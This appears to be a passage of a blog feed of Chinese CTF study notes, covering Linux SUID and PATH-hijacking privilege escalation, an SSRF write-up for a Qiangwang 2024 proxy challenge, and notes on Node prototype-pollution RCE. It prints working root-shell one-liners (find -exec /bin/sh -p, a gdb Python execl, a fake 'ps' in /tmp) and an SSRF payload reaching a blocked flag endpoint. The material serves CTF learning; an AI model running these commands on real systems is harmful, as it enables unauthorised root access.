EUID</li><li>Real Group ID, RGID：表示启动进程的实际用户组</li><li>Effective Group ID, EGID：用于确定进程的组权限</li><li>Supplementary Group IDs：表示进程所属的其他组</li></ol></li><li>文件描述符继承<ol><li>子进程会继承父进程打开的文件描述符。这意味着如果父进程打开了某个文件或网络连接，子进程也可以访问这些资源</li></ol></li><li>环境变量继承</li><li>资源限制继承</li><li><em><strong>特殊权限位</strong></em><ol><li>Set-User-ID (SUID)：如果可执行文件设置了 SUID 位，那么运行该文件的进程的有效用户 ID (EUID) 将是文件所有者的用户 ID，而不是运行该文件的用户的 ID</li><li>Set-Group-ID (SGID)：如果可执行文件设置了 SGID 位，那么运行该文件的进程的有效组 ID (EGID) 将是文件所有者的组 ID，而不是运行该文件的用户的组 ID</li></ol></li></ol><h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><h3 id="suid-ref"><a href="#suid-ref" class="headerlink" title="*suid ref"></a>*suid ref</h3><ol><li><a href="https://gtfobins.github.io/#+suid">github quick find payload</a></li><li><a href="https://blog.csdn.net/CoreNote/article/details/122093180">suid解释得挺好的</a></li><li><a href="https://blog.csdn.net/weixin_39190897/article/details/135429139">对应的suid章节附加命令很全面</a></li><li><a href="https://xz.aliyun.com/t/12535?time__1311=GqGxuCitqWq052x+xCq47wgRDnmDRi2=oD">附加一些额外的东西和命令，适合助眠</a></li><li><a href="https://cloud.tencent.com/developer/article/1878212">这篇也有一些命令</a></li><li><a href="https://www.cnblogs.com/yuy0ung/articles/18421470">suid更加深层的利用方法</a></li></ol><h3 id="什么是suid"><a href="#什么是suid" class="headerlink" title="什么是suid?"></a>什么是suid?</h3><ol><li><p>除了rwx，在linux还有三种特殊权限</p><ol><li>SUID(set user id)<ol><li>仅对二进制程序有效（binary program）</li><li>执行者对于该程序需要具有x的可执行权限</li><li>本权限仅在执行该程序的过程中有效（run-time）</li><li><strong>执行者将具有该程序拥有者的权限</strong></li></ol></li><li>SGID(set group id)<ol><li>SGID对二进制文件有用；</li><li>程序执行者对该程序来说，具有x权限；</li><li><strong>执行者在执行的过程中将获得该程序群组的权限</strong></li><li>用于二进制可执行文件上以及目录上，此目录新建的文件的所属组将自动从此目录继承</li></ol></li><li>Sticky Bit<ol><li>SBIT只针对目录有效</li><li>除非目录的属主和root用户有权限删除它，除此之外其它用户不能删除和修改这个目录 -&gt; 表示此目录的文件只能由所有者自己来删除</li><li>当 SGID 权限位应用于目录时，新创建的文件和子目录将自动继承该目录的所属组而不是创建者的组</li></ol></li></ol></li><li><p><em><strong>为什么需要suid？</strong></em></p><ol><li>例如用户想修改自己的密码，但是修改涉及到 &#x2F;etc&#x2F;shadow 文件，这个文件只有 root 权限才能修改，这时候 passwd 命令就设置了特殊权限，修改密码时临时使用了 root 的权限去修改 shadow 文件</li></ol></li><li><p><em><strong>如何进行设置</strong></em></p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+s filename   <span class="comment">#设置SUID位</span></span><br><span class="line"><span class="built_in">chmod</span> u-s filename   <span class="comment">#去掉SUID设置</span></span><br><span class="line"><span class="built_in">chmod</span> 4750 file      <span class="comment"># 在4750中，4说明SUID位被设置，7为所有者读写执行权限</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="suid提权实战注意点"><a href="#suid提权实战注意点" class="headerlink" title="suid提权实战注意点"></a>suid提权实战注意点</h3><ol><li>步骤<ol><li>查找具备 suid 权限且属主是 root 的文件</li><li>查找对应文件的利用方法（不是所有文件均可利用，需要结合时间成本考虑是否进行利用）</li></ol></li><li>Set-UID (SUID) 权限位的用户不一定是 root。SUID 权限位可以使文件在执行时，其有效用户 ID (EUID) 变成文件所有者的用户 ID，而这个所有者可以是任何用户，不仅仅是 root –&gt; <strong>所以建议使用<code>-user root</code>选项来筛查</strong></li><li><strong>自动预警</strong>: <code>find / -perm -4000 2&gt; /dev/null</code>这类查找系统 suid 特殊权限的命令被各大 HIDS 系统列入检测范围，很容易被检测出来</li></ol><h3 id="suid提权实战"><a href="#suid提权实战" class="headerlink" title="*suid提权实战"></a>*suid提权实战</h3><blockquote><p>真题可见PyBlockly_强网24</p></blockquote><ol><li><p>先查查文件</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 直接查找</span></span><br><span class="line">   <span class="comment"># 建议-user root，之后还要 ls -al 进一步查看是否当前用户可以执行</span></span><br><span class="line">   find / -user root -perm -4000</span><br><span class="line">       <span class="comment"># -user root：查找属于 root 用户的文件。</span></span><br><span class="line">       <span class="comment"># -perm -4000：查找具有 SUID 权限位的文件。-4000 表示文件的权限位中包含 SUID 位。如果是 4000 则是指准确位4000的权限位。+4000 现在可以先不管</span></span><br><span class="line">   find / -perm -4000 2&gt; /dev/null</span><br><span class="line">   find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 一套带走</span></span><br><span class="line">   find / -perm -4000 2&gt; /dev/null | <span class="keyword">while</span> <span class="built_in">read</span> file; <span class="keyword">do</span> <span class="built_in">ls</span> -l <span class="string">&quot;<span class="variable">$file</span>&quot;</span>; <span class="keyword">done</span></span><br><span class="line">      <span class="comment"># 无法直接 find / -perm -4000 2&gt; /dev/null | ls -l，原因是 ls -l 期望接收的是文件名参数，而不是标准输入。find 命令的输出通过管道传递给 ls -l，但 ls -l 并不会从标准输入读取文件名，而是将整个输入视为一个字符串</span></span><br><span class="line">      <span class="comment"># find 也会查找隐藏文件</span></span><br><span class="line">   find / -perm -4000 2&gt; /dev/null | xargs <span class="built_in">ls</span> -l</span><br><span class="line">   find / -perm -4000 -print0 2&gt; /dev/null | xargs -0 <span class="built_in">ls</span> -l</span><br><span class="line">      <span class="comment"># 需要 xargs，但是没有试成功，应该是一次性输出这样的，文件少可以马上</span></span><br><span class="line">   find / -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -l &#123;&#125; \; 2&gt; /dev/null</span><br><span class="line">      <span class="comment"># -exec command &#123;&#125; \;</span></span><br><span class="line">      <span class="comment"># &#123;&#125;：一个占位符，表示 find 命令找到的每个文件。</span></span><br><span class="line">      <span class="comment"># \;：表示 -exec 选项的结束。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>通过语言运行开shell</strong>，如使用gdb进行命令执行(新开一个有root的shell): <code>gdb -nx -ex &#39;python import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#39; -ex quit</code></p></li><li><p><strong>文件处理</strong>，如dd处理磁盘相关可以用来复制文件等，PyBlockly_强网24中就有用: <code>dd if=/flag of=/tmp/flag</code></p></li><li><p><strong>命令附加执行</strong>，如find有那么直接用find -exec，一个思路</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find ./already_existed -<span class="built_in">exec</span> /bin/sh -p \;</span><br><span class="line">find /usr/bin/su -<span class="built_in">exec</span> /bin/bash -p \; -quit    <span class="comment"># 利用find得到一个root权限的shell，su是具有suid权限的file</span></span><br><span class="line">find / -<span class="built_in">exec</span> /bin/sh -p \;  <span class="comment"># 一样可得到一个root权限的shell</span></span><br><span class="line"></span><br><span class="line">find /usr/bin/su -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br></pre></td></tr></table></figure></li></ol><h2 id="环境变量提权"><a href="#环境变量提权" class="headerlink" title="环境变量提权"></a>环境变量提权</h2><blockquote><p>环境变量的提权立足于suid提权上，思想是suid的思想，只是利用了环境变量的特性，牢记目的是要提权</p></blockquote><h3 id="环境变量ref"><a href="#环境变量ref" class="headerlink" title="*环境变量ref"></a>*环境变量ref</h3><ol><li><a href="https://www.freebuf.com/articles/system/320593.html">虽然不是很直观，但是慢慢看还是很细的，重要的是参考资料很好</a></li><li><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">一些示例</a><ol><li>出现<code>system(&#39;cat /file.txt&#39;)</code>这种时竟然不用管闭合，只需要直接<code>echo &#39;/bin/sh&#39; &gt; cat</code>就ok</li></ol></li><li><a href="https://blog.csdn.net/weixin_39190897/article/details/135429139">这篇的环境变量提权部分</a><ol><li><em><strong>有修改环境变量的具体命令</strong></em></li></ol></li><li>**<a href="https://blog.csdn.net/weixin_39190897/article/details/135429139">p牛</a></li></ol><h3 id="什么是环境变量"><a href="#什么是环境变量" class="headerlink" title="什么是环境变量"></a>什么是环境变量</h3><ol><li><p>常见的环境变量: 可以看见$PATH只是环境变量中的一个</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PATH：定义了系统在查找可执行文件时搜索的目录列表。</span><br><span class="line">HOME：用户的家目录。</span><br><span class="line">USER：当前登录用户的用户名。</span><br><span class="line">LANG：设定用户界面的语言。</span><br><span class="line">SHELL：用户使用的 shell 程序。</span><br><span class="line">TERM：终端类型。</span><br><span class="line">PS1：bash shell 提示符格式。</span><br><span class="line">LD_LIBRARY_PATH：动态链接器搜索共享库的路径。</span><br><span class="line">LD_PRELOAD：指定在程序启动时预先加载的共享库</span><br></pre></td></tr></table></figure></li><li><p>相关文件</p><ol><li>兼容性：不同的 shell（如 bash、zsh）可能有不同的环境变量配置文件，这里是bash的</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">2. 修改系统级环境变量：</span><br><span class="line">编辑 /etc/environment 文件。</span><br><span class="line">编辑 /etc/profile 文件。</span><br><span class="line">编辑 /etc/profile.d/ 目录下的脚本文件。</span><br><span class="line"></span><br><span class="line">3. 修改用户级环境变量：</span><br><span class="line">编辑 ~/.bashrc 文件。</span><br><span class="line">编辑 ~/.profile 文件。</span><br><span class="line">编辑 ~/.bash_profile 文件（适用于登录 shell）</span><br></pre></td></tr></table></figure></li></ol><h3 id="PATH的作用"><a href="#PATH的作用" class="headerlink" title="$PATH的作用"></a>$PATH的作用</h3><ol><li><em><strong>当执行一个命令时查找可执行文件的顺序</strong></em><ol><li>S1 解析命令: shell（如 Bash）会首先解析该命令。命令可以是内置命令、外部命令或脚本</li><li>S2 直接指定路径: shell直接查找执行</li><li>S3 内置命令直接执行</li><li>S4 $PATH变量查找: 如果命令不是内置命令，shell 会<strong>依次</strong>检查 PATH 环境变量。PATH 环境变量是一个由冒号（:）分隔的目录列表，指定了系统在查找可执行文件时搜索的目录顺序</li><li>S5 命令未找到: 如果在所有指定的目录中都没有找到匹配的文件，shell 会返回“命令未找到”的错误信息</li></ol></li><li>关于$PATH<ol><li><p><strong>典型的环境值</strong></p><ol><li>关于sbin: Sbin（Superuser Binary的缩写）这个目录也是用来存放二进制文件的，但它主要存放的是系统管理员使用的管理工具。例如，&#x2F;sbin目录下的命令通常需要超级用户权限才能执行</li></ol></li><li><p><strong>可以用.来设置动态当前目录</strong>，替代：需要临时在当前目录中运行可执行文件，可以使用 .&#x2F; 前缀</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/sbin：本地安装的系统管理命令。</span><br><span class="line">/usr/local/bin：本地安装的用户命令。</span><br><span class="line">/usr/sbin：系统管理命令。</span><br><span class="line">/usr/bin：用户命令。</span><br><span class="line">/sbin：基本系统管理命令，通常在启动和修复系统时使用。</span><br><span class="line">/bin：基本用户命令，通常在启动和修复系统时使用。</span><br><span class="line">   <span class="comment"># 超级用户的 PATH 通常包含 /sbin 和 /usr/sbin 和 /usr/local/sbin</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="利用原理与大大大前提"><a href="#利用原理与大大大前提" class="headerlink" title="利用原理与大大大前提"></a>利用原理与大大大前提</h3><ol><li>利用原理<ol><li>S1: 命名一个和这个系统命令相同的文件，写入&#x2F;bin&#x2F;bash, 再将存放这个文件的路径加入环境变量中(要在前面的位置)</li><li>S2: 当系统去执行这个带有系统命令的文件时，就会直接执行我们命名和这个系统命令相同的文件，而非真实的系统命令；从而实现劫持环境变量提权</li></ol></li><li>前提<ol><li>原有shell中运行的命令不是内置命令</li><li>系统中存在带有suid的文件，且这个文件中必须有系统命令</li><li>同时这个文件也应该符合suid提权利用要求在我们当前用户具有执行权限</li><li>可以修改环境变量并在首部添加</li></ol></li></ol><h3 id="PATH实战"><a href="#PATH实战" class="headerlink" title="*$PATH实战"></a>*$PATH实战</h3><ol><li><p>过一个流程</p><ol><li>记得赋予执行权限</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment"># suid部分不做流程，这里已知 /shell 执行 ps命令</span></span><br><span class="line"><span class="built_in">cd</span> /tmp </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/bash&quot;</span> &gt; ps     或者   <span class="built_in">cp</span> /bin/sh /tmp/ps</span><br><span class="line"><span class="built_in">chmod</span> 777 ps</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span>  <span class="comment">#把tmp设置在环境变量头部让系统在执行ps命令的时候先检索到tmp目录下的ps</span></span><br><span class="line">ehco <span class="variable">$PATH</span>  <span class="comment">#检查是否成功把/tmp  设置在了环境变量的头部</span></span><br><span class="line">./shell  <span class="comment">#执行shell文件，触发我们劫持的ps命令（此时sysyem运行的ps这个命令是root权限），但是此时实际执行的是  /bin/sh   ，也就是相当于以root权限去执行/bin/sh从而实现提权</span></span><br></pre></td></tr></table></figure></li><li><p><strong>使用xxd&#x2F;运行(利用报错信息)查看shell参数</strong>: 我们会遇到一种情况是给定的shell文件是已经编译好的文件，此时可以使用xxd来获取参数<code>xxd /shell</code></p></li></ol><h2 id="通配符提权"><a href="#通配符提权" class="headerlink" title="通配符提权"></a>通配符提权</h2><p><a href="https://www.freebuf.com/articles/system/176255.html">https://www.freebuf.com/articles/system/176255.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Proxy_强网24</title>
      <link href="/2024/11/03/Proxy_%E5%BC%BA%E7%BD%9124/"/>
      <url>/2024/11/03/Proxy_%E5%BC%BA%E7%BD%9124/</url>
      
        <content type="html"><![CDATA[<h2 id="分析和尝试-DONE"><a href="#分析和尝试-DONE" class="headerlink" title="分析和尝试(DONE)"></a>分析和尝试(DONE)</h2><ol><li><p>是一个go的http服务器，目标是&#x2F;v1&#x2F;readflag</p></li><li><p>发现proxy.conf中&#x2F;v1是403，那就需要绕过了，重定向？</p></li><li><p>这里的nginx是反向代理，进行转发，除了403不用管</p></li><li><p>ai一下代码进行分析(go还没学)，思路</p><ol><li>要是abs并FollowRedirects，返回nil则可以重定向</li><li>这根本就没有限制啊，直接构造发送</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将下述这个包发送到/v2/路由即可</span></span><br><span class="line"> &#123;</span><br><span class="line">     <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://target/v1/api/flag&quot;</span>,</span><br><span class="line">     <span class="string">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">     <span class="string">&quot;headers&quot;</span>: &#123;</span><br><span class="line">         <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">     &#125;,</span><br><span class="line">     <span class="string">&quot;follow_redirects&quot;</span>: <span class="literal">true</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 看来wp发现最简单的包是</span></span><br><span class="line"> &#123;<span class="string">&quot;URL&quot;</span>:<span class="string">&quot;http://127.0.0.1:8769/v1/api/flag&quot;</span>,<span class="string">&quot;Method&quot;</span>:<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;Body&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="其他注意点"><a href="#其他注意点" class="headerlink" title="*其他注意点"></a>*其他注意点</h2><ol><li><code>.ShouldBindJSON(&amp;proxyRequest)</code>：将客户端发来的 JSON 请求体解析到 proxyRequest 结构体中。这里可以不用header这里，有点理解错了，但是问题不大</li><li><em><strong>nginx反向代理</strong></em>，见proxy.conf<ol><li>反向代理就是在服务端的代理，统一收包再分流，再nginx中配置如proxy.conf</li><li>配置保存到 Nginx 的配置文件中，通常是 &#x2F;etc&#x2F;nginx&#x2F;nginx.conf 或 &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;your_config_file.conf</li></ol></li></ol><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><ol><li>感觉没什么好讲的，多chat就对了</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ProxyRequest <span class="keyword">struct</span> &#123;</span><br><span class="line">URL             <span class="type">string</span>            <span class="string">`json:&quot;url&quot; binding:&quot;required&quot;`</span></span><br><span class="line">Method          <span class="type">string</span>            <span class="string">`json:&quot;method&quot; binding:&quot;required&quot;`</span></span><br><span class="line">Body            <span class="type">string</span>            <span class="string">`json:&quot;body&quot;`</span></span><br><span class="line">Headers         <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span> <span class="string">`json:&quot;headers&quot;`</span></span><br><span class="line">FollowRedirects <span class="type">bool</span>              <span class="string">`json:&quot;follow_redirects&quot;`</span></span><br><span class="line"><span class="comment">// 解释：这里定义了接受的格式，非常容易看，map用&#123;&#125;json对象标识即可</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line"></span><br><span class="line">v1 := r.Group(<span class="string">&quot;/v1&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">v1.POST(<span class="string">&quot;/api/flag&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">cmd := exec.Command(<span class="string">&quot;/readflag&quot;</span>)</span><br><span class="line">flag, err := cmd.CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.JSON(http.StatusOK, gin.H&#123;<span class="string">&quot;flag&quot;</span>: flag&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v2 := r.Group(<span class="string">&quot;/v2&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">v2.POST(<span class="string">&quot;/api/proxy&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> proxyRequest ProxyRequest</span><br><span class="line"><span class="keyword">if</span> err := c.ShouldBindJSON(&amp;proxyRequest); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusBadRequest, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid request&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">client := &amp;http.Client&#123;</span><br><span class="line">CheckRedirect: <span class="function"><span class="keyword">func</span><span class="params">(req *http.Request, via []*http.Request)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">if</span> !req.URL.IsAbs() &#123;</span><br><span class="line"><span class="keyword">return</span> http.ErrUseLastResponse</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !proxyRequest.FollowRedirects &#123;</span><br><span class="line"><span class="keyword">return</span> http.ErrUseLastResponse</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">req, err := http.NewRequest(proxyRequest.Method, proxyRequest.URL, bytes.NewReader([]<span class="type">byte</span>(proxyRequest.Body)))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key, value := <span class="keyword">range</span> proxyRequest.Headers &#123;</span><br><span class="line">req.Header.Set(key, value)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp, err := client.Do(req)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line"></span><br><span class="line">body, err := io.ReadAll(resp.Bo</span><br><span class="line"></span><br><span class="line"><span class="comment">// proxy.conf</span></span><br><span class="line">server &#123;</span><br><span class="line">    listen <span class="number">8000</span>;</span><br><span class="line"></span><br><span class="line">    location ~ /v1 &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">403</span>; <span class="comment">// location ~ /v1：使用正则表达式匹配以 /v1 开头的请求</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~ /v2 &#123;</span><br><span class="line">        proxy_pass http:<span class="comment">//localhost:8769;   // 将匹配的请求代理到本地的 8769 端口，即你的后端服务</span></span><br><span class="line">        proxy_http_version <span class="number">1.1</span>;</span><br><span class="line">        proxy_set_header Host $host;    <span class="comment">// 设置 Host 头为原始请求的 Host，确保后端服务知道原始请求的主机名</span></span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;    <span class="comment">// 设置 X-Real-IP 头为客户端的真实 IP 地址，后端服务可以使用这个头来获取客户端的 IP</span></span><br><span class="line">        proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">        proxy_set_header Connection $connection_upgrade;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; <span class="comment">// 设置 X-Forwarded-For 头，包含客户端的真实 IP 地址，后端服务可以使用这个头来获取客户端的 IP</span></span><br><span class="line">        <span class="comment">// 因为经过了再一次转发，所以一般会传递一些请求头</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ENV hacking</title>
      <link href="/2024/11/03/ENV%20hacking/"/>
      <url>/2024/11/03/ENV%20hacking/</url>
      
        <content type="html"><![CDATA[<h2 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h2><ol><li><a href="https://www.elttam.com/blog/env/">解释性语言中的环境变量渗透</a></li><li><a href="https://po6ix.github.io/Abusing-Environment-Variables/">po6ix</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pp2rce</title>
      <link href="/2024/11/02/pp2rce/"/>
      <url>/2024/11/02/pp2rce/</url>
      
        <content type="html"><![CDATA[<blockquote><p>感慨，ai现在真是强大，真的是概念解答神<br>这篇文章适用于参数固定不可控的pp2rce，这是一类源码上的漏洞</p></blockquote><h3 id="child-process-spawn-深入部分源码"><a href="#child-process-spawn-深入部分源码" class="headerlink" title="child_process.spawn()深入部分源码"></a>child_process.spawn()深入部分源码</h3><ol><li>REF<ol><li>说实话，这篇要先看RCE in Kibana才能懂一些(等涉及到了再来学)，我一开始是没有看懂<a href="https://c1oudfl0w0.github.io/blog/2024/10/11/PP2RCE/">很细但是太菜看不懂</a></li></ol></li><li>简单先说一下：child_process 内置的6个函数底层最终都会调用 spawn(<a href="https://c1oudfl0w0.github.io/blog/2023/06/29/Nodejs%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/#child-process">详见</a>)，调用spawn后会进入子函数normalizeSpawnArguments，在该子函数中会对env变量进行赋值并会将最终的envPairs作为新进程中的环境变量存储在该进程的文件&#x2F;proc&#x2F;self&#x2F;environ中 –&gt; normalizeSpawnArguments实现中存在原型链污染的注入点(let key in中的in)</li><li>截取一些敏感的部分<ol><li><p>最终会使用execvp来执行任务<code>execvp(options-&gt;file, options-&gt;args);</code>这里的 options-&gt;file 就是我们最初传给spawn的参数。 比如我们的例子是，那么此时的file就是，当然对于有参数的命令，则 options-&gt;args 